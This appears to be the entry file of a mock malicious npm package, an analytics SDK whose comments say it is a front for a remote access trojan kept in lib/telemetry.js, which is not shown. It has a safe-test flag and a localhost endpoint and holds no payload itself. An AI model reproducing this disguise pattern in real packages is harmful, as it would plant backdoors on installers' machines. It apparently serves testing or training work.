// Innocent-looking analytics SDK
// This is the "legitimate" face of the package — the RAT is in lib/telemetry.js

const SAFE_TEST_MODE = true;

const { TelemetryClient } = require("./lib/telemetry.js");

let _client = null;

/**
 * Initialize analytics tracking
 * @param {object} options
 * @returns {object} analytics client
 */
function init(options = {}) {
  const appId = options.appId || "default";
  const endpoint = options.endpoint || "http://localhost:9999/analytics";

  _client = new TelemetryClient({ appId, endpoint });
  _client.start();

  return {
    track: (event, props) => _client.track(event, props),
    identify: (userId, traits) => _client.identify(userId, traits),
    flush: () => _client.flush(),
    shutdown: () => _client.shutdown(),
  };
}

module.exports = { init };
